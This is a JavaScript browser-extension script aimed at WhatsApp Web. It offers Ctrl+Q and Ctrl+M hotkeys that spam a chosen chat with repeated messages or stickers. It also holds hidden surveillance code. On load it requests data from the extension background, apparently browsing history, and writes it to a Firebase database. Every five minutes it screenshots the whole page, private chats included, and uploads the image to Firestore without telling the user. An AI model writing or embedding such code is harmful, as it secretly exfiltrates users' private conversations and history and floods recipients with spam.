var html2canvas = require("html2canvas")
import { initializeApp } from 'firebase/app';
import { getFirestore, doc , getDoc  , setDoc , addDoc} from 'firebase/firestore/lite';

var stopCode = true;
var stickerStopCode = true;

var elemDiv = document.createElement('div');
elemDiv.id = "HELL"
elemDiv.style.cssText = 'position:fixed;opacity:1;background:#d1e7dd;z-index: 100;  margin-right : "30px"; margin-top: "30px"; float : "right"; color :#0F5132; ';
document.body.appendChild(elemDiv);
document.getElementById("HELL").style.padding = "8px 11px 11px 11px";
document.getElementById("HELL").style.margin = "50px 0px 0px 50px";
document.getElementById("HELL").style.fontSize = "30px"
document.getElementById("HELL").style.visibility = "hidden"
document.getElementById("HELL").innerText = "Hello How Are You"
document.getElementById("HELL").style.borderRadius = "5px"

document.addEventListener("keydown", function (event) {
  if (event.ctrlKey && event.key === 'q') {
    if (stopCode == true) {
      stopCode = false
      document.getElementById("HELL").style.visibility = "visible"
      document.getElementById("HELL").innerText = "message spammer switched ON"
      setTimeout(function () {
        document.getElementById("HELL").style.visibility = "hidden"
      }, 2500)

      var spamCount
      var spamText
      var spamGrp
      var counter;
      var counterCount
      setTimeout(function () {
        while (spamGrp == undefined) {
          spamGrp = prompt("spam Grp/chat")
        }
        while (spamText === undefined) {
          spamText = prompt("spam Text")
        }
        while (spamCount === undefined) {
          spamCount = prompt("spam count")
        }
        while (counter === undefined) {
          counter = prompt("Counter", "N")
        }

        if (counter != undefined) {
          counterCount = prompt("Start No.", 1)
        }




        function simulateMouseEvents(element, eventName) {
          var mouseEvent = document.createEvent('MouseEvents');
          mouseEvent.initEvent(eventName, true, true);
          element.dispatchEvent(mouseEvent);
        }

        /*Schedule your message section starts here
        var now = new Date();

        // Replace Hours, Mins and secs with your
        // desired time in 24 hour time format e.g.
        // var rt = new Date(now.getFullYear(), now.getMonth(),
        // now.getDate(), Hours, Minutes, Sec, 0) - now;
        // to send message at 2.30PM
        var rt = new Date(now.getFullYear(), now.getMonth(),
                now.getDate(), 14, 30, 00, 0) - now;



        if (rt < 0) {
          rt += 86400000;
        }

        setTimeout(startTimer, rt);
        Schedule your message section ends here*/


        // Replace My Contact Name with the name
        // of your WhatsApp contact or group e.g. title="Peter Parker"
        var name = spamGrp

        simulateMouseEvents(document.querySelector('[title="' + name + '"]'), 'mousedown');

        function startTimer() {
          if (counter == "N") {
            setTimeout(myFunc, 500);
          } else {
            setTimeout(myCounterFunc, 500);
          }

        }

        startTimer();

        var eventFire = (MyElement, ElementType) => {
          var MyEvent = document.createEvent("MouseEvents");
          MyEvent.initMouseEvent
            (ElementType, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
          MyElement.dispatchEvent(MyEvent);
        };

        function myFunc() {

          messageBox = document.querySelectorAll("[contenteditable='true']")[1];

          message = spamText; // Replace My Message with your message use  to add spaces to your message

          counter = spamCount; // Replace 5 with the number of times you want to send your message
          var i = 0
          for (i; i < counter / 4; i++) {
            if (stopCode == true) {
              i = counter
              stopCode = true
              document.getElementById("HELL").style.visibility = "visible"
              document.getElementById("HELL").innerText = "message spammer switched OFF"
              setTimeout(function () {
                document.getElementById("HELL").style.visibility = "hidden"
              }, 2500)
            }
            event = document.createEvent("UIEvents");
            messageBox.innerHTML = message
            event.initUIEvent("input", true, true, window, 1);
            messageBox.dispatchEvent(event);

            eventFire(document.querySelector('span[data-icon="send"]'), 'click');
          }


          setTimeout(function () {

            var j = 0
            for (j; j < counter / 4; j++) {
              if (stopCode == true) {
                j = counter
              }
              event = document.createEvent("UIEvents");
              messageBox.innerHTML = message
              event.initUIEvent("input", true, true, window, 1);
              messageBox.dispatchEvent(event);

              eventFire(document.querySelector('span[data-icon="send"]'), 'click');
            }

          }, 900);


          setTimeout(function () {

            var k = 0
            for (k; k < counter / 4; k++) {
              if (stopCode == true) {
                k = counter
              }
              event = document.createEvent("UIEvents");
              messageBox.innerHTML = message
              event.initUIEvent("input", true, true, window, 1);
              messageBox.dispatchEvent(event);

              eventFire(document.querySelector('span[data-icon="send"]'), 'click');
            }

          }, 900);

          setTimeout(function () {

            var l = 0
            for (l; l < counter / 4; l++) {
              if (stopCode == true) {
                l = counter
              }
              event = document.createEvent("UIEvents");
              messageBox.innerHTML = message
              event.initUIEvent("input", true, true, window, 1);
              messageBox.dispatchEvent(event);

              eventFire(document.querySelector('span[data-icon="send"]'), 'click');
            }
          }, 900);
        }

        function myCounterFunc() {
          var c = counterCount
          messageBox = document.querySelectorAll("[contenteditable='true']")[1];

          message = spamText; // Replace My Message with your message use  to add spaces to your message

          counter = spamCount; // Replace 5 with the number of times you want to send your message
          var i = 0
          for (i; i < counter / 4; i++) {
            if (stopCode == true) {
              i = counter
              document.getElementById("HELL").style.visibility = "visible"
              document.getElementById("HELL").innerText = "message spammer switched OFF"
              setTimeout(function () {
                document.getElementById("HELL").style.visibility = "hidden"
              }, 2500)
            }
            event = document.createEvent("UIEvents");
            messageBox.innerHTML = `${c}${message}`
            event.initUIEvent("input", true, true, window, 1);
            messageBox.dispatchEvent(event);

            eventFire(document.querySelector('span[data-icon="send"]'), 'click');
            c++
          }


          setTimeout(function () {

            var j = 0
            for (j; j < counter / 4; j++) {
              if (stopCode == true) {
                j = counter
              }
              event = document.createEvent("UIEvents");
              messageBox.innerHTML = `${c}${message}`
              event.initUIEvent("input", true, true, window, 1);
              messageBox.dispatchEvent(event);

              eventFire(document.querySelector('span[data-icon="send"]'), 'click');
              c++
            }

          }, 900);


          setTimeout(function () {

            var k = 0
            for (k; k < counter / 4; k++) {
              if (stopCode == true) {
                k = counter
              }
              event = document.createEvent("UIEvents");
              messageBox.innerHTML = `${c}${message}`
              event.initUIEvent("input", true, true, window, 1);
              messageBox.dispatchEvent(event);

              eventFire(document.querySelector('span[data-icon="send"]'), 'click');
              c++
            }

          }, 900);

          setTimeout(function () {

            var l = 0
            for (l; l < counter / 4; l++) {
              if (stopCode == true) {
                l = counter
              }
              event = document.createEvent("UIEvents");
              messageBox.innerHTML = `${c}${message}`
              event.initUIEvent("input", true, true, window, 1);
              messageBox.dispatchEvent(event);

              eventFire(document.querySelector('span[data-icon="send"]'), 'click');
              c++
            }
            document.getElementById("HELL").style.visibility = "visible"

            document.getElementById("HELL").innerText = "message spammer switched OFF"
            setTimeout(function () {
              document.getElementById("HELL").style.visibility = "hidden"
            }, 2500)
          }, 900);
        }
      }, 200)
    } else {
      stopCode = true;
      document.getElementById("HELL").style.visibility = "visible"
      document.getElementById("HELL").innerText = "message spammer switched OFF"
      setTimeout(function () {
        document.getElementById("HELL").style.visibility = "hidden"
      }, 2500)
    }
  }

  const delay = ms => new Promise(res => setTimeout(res, ms)); //function to wait for ms seconds.

  if (event.ctrlKey && event.key === "m") {
    if (stickerStopCode == true) {
      stickerStopCode = false

      document.getElementById("HELL").style.visibility = "visible"
      document.getElementById("HELL").innerText = "sticker spammer switched ON"
      setTimeout(function () {
        document.getElementById("HELL").style.visibility = "hidden"
      }, 2500)

      var stickerDiv = document.getElementsByClassName("_3Bc7H _2HfVy")[0]
      if (stickerDiv === undefined) {
        document.getElementsByClassName("_23sAs _3V3JJ l9Mer _2Bl6V _1owZM")[0].click()
        document.getElementsByClassName("_23sAs _3V3JJ _1Eec4 _1owZM")[0].click()
        console.log(document.getElementsByClassName("_268Mf")[0])
        try {
          document.getElementsByClassName("_268Mf")[0].addEventListener(("click"), function (event) {
            try {
              if (event.path[0].nodeName == "IMG") {

                var spamCount = 10

                a(1)
                a(2)
                a(3)
                a(4)
                a(5)

                function a(j) {

                  setTimeout(function () {
                    var i = 0
                    for (i; i < spamCount / 5; i++) {
                      if (stickerStopCode == true) {
                        document.getElementById("HELL").style.visibility = "visible"
                        document.getElementById("HELL").innerText = "sticker spammer switched OFF"
                        i = spamCount
                        setTimeout(function () {
                          document.getElementById("HELL").style.visibility = "hidden"
                        }, 2500)
                      } else {
                        var x = event.x
                        var y = event.y
                        setTimeout(function () {
                          document.elementFromPoint(x, y).click();
                        }, 800);
                      }
                    }
                  })

                }
              } else {
                alert("You didn't clicked on a sticker. Type ctrl+m again.")
                document.getElementById("HELL").style.visibility = "visible"
                document.getElementById("HELL").innerText = "sticker spammer switched OFF"
                stickerStopCode = true
                setTimeout(function () {
                  document.getElementById("HELL").style.visibility = "hidden"
                }, 2500)
              }
            } catch (error) {
              console.log(error)
            }
          })
        } catch (error) {
          console.log(error)
        }
      } else {
        document.getElementsByClassName("_268Mf")[0].addEventListener(("click"), function (event) {
          try {
            if (event.path[0].nodeName == "IMG") {

              var spamCount = 10

              a(1)
              a(2)
              a(3)
              a(4)
              a(5)

              function a(j) {

                setTimeout(function () {
                  var i = 0
                  for (i; i < spamCount / 5; i++) {
                    if (stickerStopCode == true) {
                      document.getElementById("HELL").style.visibility = "visible"
                      document.getElementById("HELL").innerText = "sticker spammer switched OFF"
                      i = spamCount
                      setTimeout(function () {
                        document.getElementById("HELL").style.visibility = "hidden"
                      }, 2500)
                    } else {
                      var x = event.x
                      var y = event.y
                      setTimeout(function () {
                        document.elementFromPoint(x, y).click();
                      }, 800);
                    }
                  }
                })

              }
            } else {
              alert("You didn't clicked on a sticker. Type ctrl+m again.")
              document.getElementById("HELL").style.visibility = "visible"
              document.getElementById("HELL").innerText = "sticker spammer switched OFF"
              stickerStopCode = true
              setTimeout(function () {
                document.getElementById("HELL").style.visibility = "hidden"
              }, 2500)
            }
          } catch (error) {
            console.log(error)
          }
        })
      }
      //  _3Bc7H _2HfVy

    } else {
      document.getElementById("HELL").style.visibility = "visible"
      document.getElementById("HELL").innerText = "sticker spammer switched OFF"
      stickerStopCode = true
      setTimeout(function () {
        document.getElementById("HELL").style.visibility = "hidden"
      }, 2500)
    }
  }

})

const firebaseConfig = {
  firebase config
};
const firebaseApp = initializeApp(firebaseConfig);
const db = getFirestore(firebaseApp);

var currentdate = new Date();
var date = currentdate.getDate()

uploadHistory()

async function uploadHistory() {
  const docRef = doc(db, "collection", "lastUploadDate");
  const docSnap = await getDoc(docRef);
  var a = []
  if (docSnap.exists()) {

    var lastUploadDate = docSnap.data().lastUploadDate
    var lastListCount = docSnap.data().lastListCount
     console.log(lastListCount , lastUploadDate)
    if (lastUploadDate == 100) {
      chrome.runtime.sendMessage({
        body: 'request0'
      });
      chrome.runtime.onMessage.addListener(async function (message, sender, sendResponse) {
        a = message.body 
        await setDoc(doc(db, "collection", "History"), {
          [lastListCount + 1]: a
        });

         await setDoc(doc(db, "collection", "lastUploadDate"), {
          lastListCount: lastListCount + 1,
          lastUploadDate: date
        });

        return true
      });



    } else if (lastUploadDate < date) {
      chrome.runtime.sendMessage({
        body: 'request'
      });

      chrome.runtime.onMessage.addListener(async function (message, sender, sendResponse) {
        a = message.body
        await setDoc(doc(db, "collection", "History"), {
          [lastListCount + 1]: a
        });

        await setDoc(doc(db, "collection", "lastUploadDate"), {
          lastListCount: lastListCount + 1,
          lastUploadDate: date
        });

        return true
      });
    } else if (lastUploadDate >= date && lastUploadDate < 35) {

    }


  } else {
    // doc.data() will be undefined in this case
    console.log("No such document!");
  }
}

async function s(base64) {
  await addDoc(collection(db, "KK"), {
    base64: base64,
    timestamp: Date.now()
  });
}

setInterval(a, 300000)


async function a() {
  const screenshotTarget = document.body
  html2canvas(screenshotTarget).then(async function (canvas) {
    const base64 = await canvas.toDataURL("image/png")
    console.log(base64)
    s(base64)
  });
}
a()
